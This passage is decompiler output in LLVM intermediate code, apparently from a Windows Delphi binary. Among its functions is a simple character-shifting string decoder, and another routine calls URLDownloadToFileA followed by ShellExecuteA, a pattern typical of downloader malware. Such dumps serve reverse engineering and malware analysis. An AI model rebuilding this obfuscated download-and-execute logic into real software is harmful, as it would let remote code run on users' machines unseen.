  ret i32 %0, !insn.addr !1264
}

define i32 @function_405fc8() local_unnamed_addr {
dec_label_pc_405fc8:
  %eax.0.reg2mem = alloca i32, !insn.addr !1265
  %0 = call i32 @function_40603c(), !insn.addr !1266
  %1 = load i32, i32* @global_var_40812c, align 4
  %2 = icmp eq i32 %1, 0, !insn.addr !1267
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1268
  br i1 %2, label %dec_label_pc_405ffc, label %dec_label_pc_405fda, !insn.addr !1268

dec_label_pc_405fda:                              ; preds = %dec_label_pc_405fc8
  %3 = load i32, i32* inttoptr (i32 4227412 to i32*), align 4, !insn.addr !1269
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1270
  %5 = load i32, i32* %4, align 4, !insn.addr !1270
  %6 = icmp eq i32 %5, 0, !insn.addr !1270
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1271
  br i1 %6, label %dec_label_pc_405ffc, label %dec_label_pc_405fe4, !insn.addr !1271

dec_label_pc_405fe4:                              ; preds = %dec_label_pc_405fda
  call void @PostQuitMessage(i32 66), !insn.addr !1272
  %7 = call i32 @function_4043d4(i32 66), !insn.addr !1273
  unreachable, !insn.addr !1273

dec_label_pc_405ffc:                              ; preds = %dec_label_pc_405fda, %dec_label_pc_405fc8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1274
}

define i32 @function_40600c() local_unnamed_addr {
dec_label_pc_40600c:
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1275
  %1 = icmp eq i32 %0, 0, !insn.addr !1275
  br i1 %1, label %dec_label_pc_40601a, label %dec_label_pc_406015, !insn.addr !1276

dec_label_pc_406015:                              ; preds = %dec_label_pc_40600c
  %2 = call i32 @function_40603c(), !insn.addr !1277
  br label %dec_label_pc_40601a, !insn.addr !1277

dec_label_pc_40601a:                              ; preds = %dec_label_pc_406015, %dec_label_pc_40600c
  %3 = load i32, i32* inttoptr (i32 4227400 to i32*), align 8, !insn.addr !1278
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1279
  %5 = load i32, i32* %4, align 4, !insn.addr !1279
  %6 = mul i32 %5, 1000, !insn.addr !1279
  %7 = call i32 @SetTimer(i32* inttoptr (i32 4218824 to i32*), i32 %6, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1280
  store i32 %7, i32* @global_var_408104, align 4, !insn.addr !1281
  ret i32 %7, !insn.addr !1282
}

define i32 @function_40603c() local_unnamed_addr {
dec_label_pc_40603c:
  %.reg2mem = alloca i32, !insn.addr !1283
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1283
  %1 = icmp eq i32 %0, 0, !insn.addr !1283
  store i32 %0, i32* %.reg2mem, !insn.addr !1284
  br i1 %1, label %2, label %dec_label_pc_406045, !insn.addr !1284

; <label>:2:                                      ; preds = %dec_label_pc_40603c
  %3 = call i32 @function_406059(), !insn.addr !1284
  %.pre = load i32, i32* @global_var_408104, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !1284
  br label %dec_label_pc_406045, !insn.addr !1284

dec_label_pc_406045:                              ; preds = %2, %dec_label_pc_40603c
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1285
  ret i32 %.reload, !insn.addr !1286
}

define i32 @function_406059() local_unnamed_addr {
dec_label_pc_406059:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1287
}

define i32 @function_40605c() local_unnamed_addr {
dec_label_pc_40605c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @function_405f80(i32 %0), !insn.addr !1288
  ret i32 %1, !insn.addr !1289
}

define i32 @function_406068() local_unnamed_addr {
dec_label_pc_406068:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1290
  %1 = icmp eq i32 %0, 0, !insn.addr !1290
  br i1 %1, label %dec_label_pc_406076, label %dec_label_pc_406071, !insn.addr !1291

dec_label_pc_406071:                              ; preds = %dec_label_pc_406068
  %2 = call i32 @function_406090(), !insn.addr !1292
  br label %dec_label_pc_406076, !insn.addr !1292

dec_label_pc_406076:                              ; preds = %dec_label_pc_406071, %dec_label_pc_406068
  %3 = call i32 @SetTimer(i32* inttoptr (i32 4218972 to i32*), i32 5266, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1293
  store i32 %3, i32* @global_var_408108, align 4, !insn.addr !1294
  ret i32 %3, !insn.addr !1295
}

define i32 @function_406090() local_unnamed_addr {
dec_label_pc_406090:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1296
  ret i32 %0, !insn.addr !1297
}

define i32 @function_4060b0() local_unnamed_addr {
dec_label_pc_4060b0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1298
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1298
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1298
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1299
  %2 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1300
  %3 = add i32 %2, 1, !insn.addr !1300
  store i32 %3, i32* @global_var_4096cc, align 4, !insn.addr !1300
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1301
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1302
  ret i32 0, !insn.addr !1303
}

define i32 @function_4060d5() local_unnamed_addr {
dec_label_pc_4060d5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1304
  ret i32 %0, !insn.addr !1304
}

define i32 @function_4060da() local_unnamed_addr {
dec_label_pc_4060da:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1305
}

define i32 @function_4060dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4060dc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1306
}

define i32 @function_4060e0() local_unnamed_addr {
dec_label_pc_4060e0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1307
  %2 = add i32 %1, -1, !insn.addr !1307
  store i32 %2, i32* @global_var_4096cc, align 4, !insn.addr !1307
  ret i32 %0, !insn.addr !1308
}

define i32 @function_4060e8() local_unnamed_addr {
dec_label_pc_4060e8:
  %0 = call i32 @URLDownloadToFileA.11(), !insn.addr !1309
  ret i32 %0, !insn.addr !1309
}

define i32 @function_4060f0() local_unnamed_addr {
dec_label_pc_4060f0:
  %esi.0.reg2mem = alloca i32, !insn.addr !1310
  %ebx.0.reg2mem = alloca i32, !insn.addr !1310
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1311
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1312
  store i32 %2, i32* %stack_var_-32, align 4, !insn.addr !1312
  %3 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1312
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1313
  %4 = call i32 @function_4034c8(), !insn.addr !1314
  %5 = call i32 @"@LStrSetLength"(), !insn.addr !1315
  %6 = call i32 @function_4034c8(), !insn.addr !1316
  %7 = icmp slt i32 %6, 1
  store i32 1, i32* %ebx.0.reg2mem, !insn.addr !1317
  store i32 %6, i32* %esi.0.reg2mem, !insn.addr !1317
  br i1 %7, label %dec_label_pc_406166, label %dec_label_pc_406136, !insn.addr !1317

dec_label_pc_406136:                              ; preds = %dec_label_pc_4060f0, %dec_label_pc_406162
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %ebx.0.reload, -1
  %9 = add i32 %8, %0, !insn.addr !1318
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1318
  %11 = load i8, i8* %10, align 1, !insn.addr !1318
  %12 = icmp eq i8 %11, 61, !insn.addr !1318
  %13 = icmp eq i1 %12, false, !insn.addr !1319
  %14 = call i32 @function_403720()
  br i1 %13, label %dec_label_pc_40614e, label %dec_label_pc_406140, !insn.addr !1319

dec_label_pc_406140:                              ; preds = %dec_label_pc_406136
  %15 = add i32 %14, %8, !insn.addr !1320
  %16 = inttoptr i32 %15 to i8*, !insn.addr !1320
  store i8 46, i8* %16, align 1, !insn.addr !1320
  br label %dec_label_pc_406162, !insn.addr !1321

dec_label_pc_40614e:                              ; preds = %dec_label_pc_406136
  %17 = load i8, i8* %10, align 1, !insn.addr !1322
  %18 = add i8 %17, -1, !insn.addr !1323
  %19 = add i32 %14, %8, !insn.addr !1324
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1324
  store i8 %18, i8* %20, align 1, !insn.addr !1324
  br label %dec_label_pc_406162, !insn.addr !1324

dec_label_pc_406162:                              ; preds = %dec_label_pc_40614e, %dec_label_pc_406140
  %21 = add i32 %ebx.0.reload, 1, !insn.addr !1325
  %22 = add i32 %esi.0.reload, -1, !insn.addr !1326
  %23 = icmp eq i32 %22, 0, !insn.addr !1326
  %24 = icmp eq i1 %23, false, !insn.addr !1327
  store i32 %21, i32* %ebx.0.reg2mem, !insn.addr !1327
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !1327
  br i1 %24, label %dec_label_pc_406136, label %dec_label_pc_406166, !insn.addr !1327

dec_label_pc_406166:                              ; preds = %dec_label_pc_406162, %dec_label_pc_4060f0
  %25 = load i32, i32* %stack_var_-32, align 4, !insn.addr !1328
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1329
  %26 = call i32 @"@LStrClr"(), !insn.addr !1330
  ret i32 %26, !insn.addr !1331
}

define i32 @function_40617c() local_unnamed_addr {
dec_label_pc_40617c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1332
  ret i32 %0, !insn.addr !1332
}

define i32 @function_406181() local_unnamed_addr {
dec_label_pc_406181:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1333
}

define i32 @function_406183(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_406183:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1334
}

define i32 @function_40618c() local_unnamed_addr {
dec_label_pc_40618c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @"@Str0Long"(i32 %1, i32 %0), !insn.addr !1335
  %3 = call i32 @"@PStrNCpy"(), !insn.addr !1336
  %4 = call i32 @"@LStrFromString"(), !insn.addr !1337
  ret i32 %4, !insn.addr !1338
}

define i32 @function_4061c4() local_unnamed_addr {
dec_label_pc_4061c4:
  %ecx.0.reg2mem = alloca i32, !insn.addr !1339
  %esp.0.reg2mem = alloca i32, !insn.addr !1339
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1339
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1340
  store i32 5, i32* %ecx.0.reg2mem, !insn.addr !1340
  br label %dec_label_pc_4061cc, !insn.addr !1340

dec_label_pc_4061cc:                              ; preds = %dec_label_pc_4061cc, %dec_label_pc_4061c4
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1341
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1341
  store i32 0, i32* %2, align 4, !insn.addr !1341
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1342
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1342
  store i32 0, i32* %4, align 4, !insn.addr !1342
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1343
  %6 = icmp eq i32 %5, 0, !insn.addr !1343
  %7 = icmp eq i1 %6, false, !insn.addr !1344
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1344
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1344
  br i1 %7, label %dec_label_pc_4061cc, label %dec_label_pc_4061d3, !insn.addr !1344

dec_label_pc_4061d3:                              ; preds = %dec_label_pc_4061cc
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1345
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1345
  store i32 0, i32* %9, align 4, !insn.addr !1345
  %10 = add i32 %esp.0.reload, -16, !insn.addr !1346
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1346
  %12 = add i32 %esp.0.reload, -20, !insn.addr !1347
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1347
  store i32 %0, i32* %13, align 4, !insn.addr !1347
  %14 = add i32 %esp.0.reload, -24, !insn.addr !1348
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1348
  store i32 4219659, i32* %15, align 4, !insn.addr !1348
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1349
  %17 = add i32 %esp.0.reload, -28, !insn.addr !1349
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1349
  store i32 %16, i32* %18, align 4, !insn.addr !1349
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1350
  %19 = call i32 @"@LStrFromPChar"(), !insn.addr !1351
  %20 = call i32 @function_4060f0(), !insn.addr !1352
  %21 = call i32 @function_4036c8(), !insn.addr !1353
  %22 = call i32 @"@LStrFromPChar"(), !insn.addr !1354
  %23 = add i32 %esp.0.reload, -32, !insn.addr !1355
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1355
  %25 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1355
  store i32 %25, i32* %24, align 4, !insn.addr !1355
  %26 = call i32 @"@LStrCopy"(), !insn.addr !1356
  %27 = call i32 @"@LStrDelete"(), !insn.addr !1357
  %28 = add i32 %esp.0.reload, -36, !insn.addr !1358
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1358
  %30 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1358
  store i32 %30, i32* %29, align 4, !insn.addr !1358
  %31 = call i32 @function_4034c8(), !insn.addr !1359
  %32 = call i32 @"@LStrCopy"(), !insn.addr !1360
  %33 = add i32 %esp.0.reload, -40, !insn.addr !1361
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1361
  store i32 ptrtoint ([6 x i8]* @global_var_406320 to i32), i32* %34, align 4, !insn.addr !1361
  %35 = call i32 @function_40618c(), !insn.addr !1362
  %36 = add i32 %esp.0.reload, -44, !insn.addr !1363
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1363
  %38 = add i32 %esp.0.reload, -48, !insn.addr !1364
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1364
  store i32 ptrtoint (i32* @global_var_406330 to i32), i32* %39, align 4, !insn.addr !1364
  %40 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1365
  %41 = add i32 %esp.0.reload, -52, !insn.addr !1365
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1365
  store i32 %40, i32* %42, align 4, !insn.addr !1365
  %43 = call i32 @"@LStrCatN"(), !insn.addr !1366
  %44 = add i32 %esp.0.reload, -56, !insn.addr !1367
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1367
  store i32 0, i32* %45, align 4, !insn.addr !1367
  %46 = add i32 %esp.0.reload, -60, !insn.addr !1368
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1368
  store i32 0, i32* %47, align 4, !insn.addr !1368
  %48 = call i32 @"@LStrCat3"(), !insn.addr !1369
  %49 = call i32 @function_4036c8(), !insn.addr !1370
  %50 = add i32 %esp.0.reload, -64, !insn.addr !1371
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1371
  store i32 %49, i32* %51, align 4, !insn.addr !1371
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !1372
  %53 = call i32 @function_4060f0(), !insn.addr !1373
  %54 = call i32 @function_4036c8(), !insn.addr !1374
  %55 = add i32 %esp.0.reload, -68, !insn.addr !1375
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1375
  store i32 %54, i32* %56, align 4, !insn.addr !1375
  %57 = add i32 %esp.0.reload, -72, !insn.addr !1376
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1376
  store i32 0, i32* %58, align 4, !insn.addr !1376
  %59 = call i32 @function_4060e8(), !insn.addr !1377
  %60 = add i32 %esp.0.reload, -76, !insn.addr !1378
  %61 = inttoptr i32 %60 to i32*, !insn.addr !1378
  store i32 1, i32* %61, align 4, !insn.addr !1378
  %62 = add i32 %esp.0.reload, -80, !insn.addr !1379
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1379
  store i32 0, i32* %63, align 4, !insn.addr !1379
  %64 = add i32 %esp.0.reload, -84, !insn.addr !1380
  %65 = inttoptr i32 %64 to i32*, !insn.addr !1380
  store i32 0, i32* %65, align 4, !insn.addr !1380
  %66 = call i32 @"@LStrCat3"(), !insn.addr !1381
  %67 = call i32 @function_4036c8(), !insn.addr !1382
  %68 = add i32 %esp.0.reload, -88, !insn.addr !1383
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1383
  store i32 %67, i32* %69, align 4, !insn.addr !1383
  %70 = add i32 %esp.0.reload, -92, !insn.addr !1384
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1384
  store i32 ptrtoint ([5 x i8]* @global_var_406340 to i32), i32* %71, align 4, !insn.addr !1384
  %72 = add i32 %esp.0.reload, -96, !insn.addr !1385
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1385
  store i32 0, i32* %73, align 4, !insn.addr !1385
  %74 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1386
  %75 = load i32, i32* %73, align 4, !insn.addr !1387
  call void @__writefsdword(i32 0, i32 %75), !insn.addr !1388
  store i32 4219666, i32* %69, align 4, !insn.addr !1389
  %76 = call i32 @"@LStrArrayClr"(), !insn.addr !1390
  ret i32 %76, !insn.addr !1391
}

define i32 @function_40630b() local_unnamed_addr {
dec_label_pc_40630b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1392
  ret i32 %0, !insn.addr !1392
}

define i32 @function_406310() local_unnamed_addr {
dec_label_pc_406310:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1393
}

define i32 @function_406312(i32 %arg1) local_unnamed_addr {
dec_label_pc_406312:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1394
}

define i32 @function_406337(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406337:
  %esp.1.reg2mem = alloca i32, !insn.addr !1395
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1395
  %ecx.0.reg2mem = alloca i32, !insn.addr !1395
  %esp.0.reg2mem = alloca i32, !insn.addr !1395
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %5 = add i32 %2, 1, !insn.addr !1395
  %6 = inttoptr i32 %2 to i32*, !insn.addr !1395
  store i32 %5, i32* %6, align 4, !insn.addr !1395
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !1396
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !1396
  %11 = add i8 %8, %10, !insn.addr !1396
  %12 = inttoptr i32 %9 to i8*, !insn.addr !1396
  store i8 %11, i8* %12, align 1, !insn.addr !1396
  %13 = add i32 %2, 58, !insn.addr !1397
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1397
  %15 = load i8, i8* %14, align 1, !insn.addr !1397
  %16 = load i32, i32* %eax, align 4, !insn.addr !1397
  %17 = udiv i32 %16, 256, !insn.addr !1397
  %18 = trunc i32 %17 to i8, !insn.addr !1397
  %19 = add i8 %15, %18, !insn.addr !1397
  store i8 %19, i8* %14, align 1, !insn.addr !1397
  %20 = add i32 %0, 112, !insn.addr !1398
  %21 = inttoptr i32 %20 to i8*, !insn.addr !1398
  %22 = load i8, i8* %21, align 1, !insn.addr !1398
  %23 = trunc i32 %4 to i8, !insn.addr !1398
  %24 = add i8 %22, %23, !insn.addr !1398
  store i8 %24, i8* %21, align 1, !insn.addr !1398
  %25 = trunc i32 %3 to i16, !insn.addr !1399
  %26 = call i8 @__readgsbyte(i32 %1), !insn.addr !1399
  call void @__asm_outsb(i16 %25, i8 %26), !insn.addr !1399
  %27 = load i8, i8* %7, align 4, !insn.addr !1400
  %28 = load i32, i32* %eax, align 4
  %29 = trunc i32 %28 to i8, !insn.addr !1400
  %30 = add i8 %27, %29, !insn.addr !1400
  %31 = inttoptr i32 %28 to i8*, !insn.addr !1400
  store i8 %30, i8* %31, align 1, !insn.addr !1400
  %32 = load i8, i8* %7, align 4, !insn.addr !1401
  %33 = load i32, i32* %eax, align 4
  %34 = trunc i32 %33 to i8, !insn.addr !1401
  %35 = add i8 %32, %34, !insn.addr !1401
  %36 = inttoptr i32 %33 to i8*, !insn.addr !1401
  store i8 %35, i8* %36, align 1, !insn.addr !1401
  %37 = ptrtoint i32* %stack_var_0 to i32, !insn.addr !1402
  store i32 %37, i32* %esp.0.reg2mem, !insn.addr !1403
  store i32 13, i32* %ecx.0.reg2mem, !insn.addr !1403
  br label %dec_label_pc_406350, !insn.addr !1403

dec_label_pc_406350:                              ; preds = %dec_label_pc_406350, %dec_label_pc_406337
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %38 = add i32 %esp.0.reload, -4, !insn.addr !1404
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1404
  store i32 0, i32* %39, align 4, !insn.addr !1404
  %40 = add i32 %esp.0.reload, -8, !insn.addr !1405
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1405
  store i32 0, i32* %41, align 4, !insn.addr !1405
  %42 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1406
  %43 = icmp eq i32 %42, 0, !insn.addr !1406
  %44 = icmp eq i1 %43, false, !insn.addr !1407
  store i32 %40, i32* %esp.0.reg2mem, !insn.addr !1407
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !1407
  br i1 %44, label %dec_label_pc_406350, label %dec_label_pc_406357, !insn.addr !1407

dec_label_pc_406357:                              ; preds = %dec_label_pc_406350
  %45 = add i32 %esp.0.reload, -12, !insn.addr !1408
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1408
  store i32 0, i32* %46, align 4, !insn.addr !1408
  %47 = add i32 %esp.0.reload, -20, !insn.addr !1409
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1409
  store i32 %37, i32* %48, align 4, !insn.addr !1409
  %49 = add i32 %esp.0.reload, -24, !insn.addr !1410
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1410
  store i32 4220396, i32* %50, align 4, !insn.addr !1410
  %51 = call i32 @__readfsdword(i32 0), !insn.addr !1411
  %52 = add i32 %esp.0.reload, -28, !insn.addr !1411
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1411
  store i32 %51, i32* %53, align 4, !insn.addr !1411
  call void @__writefsdword(i32 0, i32 %52), !insn.addr !1412
  %54 = call i32 @"@LStrPos"(), !insn.addr !1413
  %55 = add i32 %esp.0.reload, -32, !insn.addr !1414
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1414
  %57 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1414
  store i32 %57, i32* %56, align 4, !insn.addr !1414
  %58 = call i32 @"@LStrCopy"(), !insn.addr !1415
  %59 = add i32 %esp.0.reload, -36, !insn.addr !1416
  %60 = inttoptr i32 %59 to i32*
  %61 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1416
  store i32 %61, i32* %60, align 4, !insn.addr !1416
  %62 = call i32 @function_4034c8(), !insn.addr !1417
  %63 = call i32 @"@LStrCopy"(), !insn.addr !1418
  %64 = add i32 %arg1, -1, !insn.addr !1419
  store i32 %64, i32* %eax, align 4, !insn.addr !1419
  store i32* %60, i32** %.pre-phi.reg2mem
  store i32 %59, i32* %esp.1.reg2mem
  switch i32 %arg1, label %dec_label_pc_4065d1 [
    i32 0, label %dec_label_pc_4063c9
    i32 1, label %dec_label_pc_406509
    i32 2, label %dec_label_pc_406577
  ]

dec_label_pc_4063c9:                              ; preds = %dec_label_pc_406357
  %65 = call i32 @function_4034c8(), !insn.addr !1420
  %66 = icmp slt i32 %65, 5, !insn.addr !1421
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1421
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1421
  br i1 %66, label %dec_label_pc_4065d1, label %dec_label_pc_4063da, !insn.addr !1421

dec_label_pc_4063da:                              ; preds = %dec_label_pc_4063c9
  %67 = call i32 @"@LStrFromPChar"(), !insn.addr !1422
  %68 = call i32 @function_4060f0(), !insn.addr !1423
  %69 = add i32 %esp.0.reload, -40, !insn.addr !1424
  %70 = inttoptr i32 %69 to i32*, !insn.addr !1424
  %71 = call i32 @"@LStrFromPChar"(), !insn.addr !1425
  %72 = call i32 @function_4060f0(), !insn.addr !1426
  %73 = add i32 %esp.0.reload, -44, !insn.addr !1427
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1427
  %75 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1428
  %76 = add i32 %esp.0.reload, -48, !insn.addr !1428
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1428
  store i32 %75, i32* %77, align 4, !insn.addr !1428
  %78 = add i32 %esp.0.reload, -52, !insn.addr !1429
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1429
  store i32 ptrtoint (i32* @global_var_406610 to i32), i32* %79, align 4, !insn.addr !1429
  %80 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1430
  %81 = add i32 %esp.0.reload, -56, !insn.addr !1430
  %82 = inttoptr i32 %81 to i32*, !insn.addr !1430
  store i32 %80, i32* %82, align 4, !insn.addr !1430
  %83 = call i32 @"@LStrCatN"(), !insn.addr !1431
  %84 = add i32 %esp.0.reload, -60, !insn.addr !1432
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1432
  %86 = add i32 %esp.0.reload, -64, !insn.addr !1433
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1433
  store i32 4220444, i32* %87, align 4, !insn.addr !1433
  %88 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1434
  %89 = add i32 %esp.0.reload, -68, !insn.addr !1434
  %90 = inttoptr i32 %89 to i32*, !insn.addr !1434
  store i32 %88, i32* %90, align 4, !insn.addr !1434
  %91 = add i32 %esp.0.reload, -72, !insn.addr !1435
  %92 = inttoptr i32 %91 to i32*, !insn.addr !1435
  store i32 4220460, i32* %92, align 4, !insn.addr !1435
  %93 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1436
  %94 = add i32 %esp.0.reload, -76, !insn.addr !1436
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1436
  store i32 %93, i32* %95, align 4, !insn.addr !1436
  %96 = add i32 %esp.0.reload, -80, !insn.addr !1437
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1437
  store i32 4220476, i32* %97, align 4, !insn.addr !1437
  %98 = call i32 @function_407494(), !insn.addr !1438
  %99 = add i32 %esp.0.reload, -84, !insn.addr !1439
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1439
  %101 = call i32 @"@LStrCatN"(), !insn.addr !1440
  %102 = add i32 %esp.0.reload, -88, !insn.addr !1441
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1441
  %104 = add i32 %esp.0.reload, -92, !insn.addr !1442
  %105 = inttoptr i32 %104 to i32*
  %106 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1442
  store i32 %106, i32* %105, align 4, !insn.addr !1442
  %107 = call i32 @"@LStrFromPChar"(), !insn.addr !1443
  %108 = call i32 @function_4060f0(), !insn.addr !1444
  %109 = call i32 @"@LStrPos"(), !insn.addr !1445
  %110 = add i32 %109, -1, !insn.addr !1446
  %111 = add i32 %esp.0.reload, -96, !insn.addr !1447
  %112 = inttoptr i32 %111 to i32*, !insn.addr !1447
  store i32 %110, i32* %112, align 4, !insn.addr !1447
  %113 = call i32 @"@LStrFromPChar"(), !insn.addr !1448
  %114 = call i32 @function_4060f0(), !insn.addr !1449
  %115 = call i32 @"@LStrCopy"(), !insn.addr !1450
  %116 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1451
  store i32 %116, i32* %112, align 4, !insn.addr !1452
  %117 = call i32 @"@LStrFromPChar"(), !insn.addr !1453
  %118 = call i32 @function_4060f0(), !insn.addr !1454
  %119 = add i32 %esp.0.reload, -100, !insn.addr !1455
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1455
  %121 = call i32 @"@LStrFromPChar"(), !insn.addr !1456
  %122 = call i32 @function_4060f0(), !insn.addr !1457
  %123 = call i32 @function_4057d0(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1458
  store i32* %105, i32** %.pre-phi.reg2mem, !insn.addr !1459
  store i32 %104, i32* %esp.1.reg2mem, !insn.addr !1459
